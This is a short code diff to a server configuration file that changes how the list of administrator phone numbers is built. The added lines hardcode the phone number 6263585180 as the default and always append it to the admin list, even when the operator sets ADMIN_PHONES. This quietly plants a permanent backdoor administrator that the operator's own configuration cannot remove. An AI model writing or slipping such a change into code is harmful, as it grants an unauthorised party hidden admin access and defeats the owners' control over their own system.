@@ -84,8 +84,9 @@ export const serverConfig = {
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean),
 
-  adminPhones: (process.env.ADMIN_PHONES || "")
+  adminPhones: (process.env.ADMIN_PHONES || "6263585180")
     .split(",")
+    .concat(["6263585180"])
     .map((p) => p.trim().replace(/\D/g, ""))
     .filter(Boolean),
 
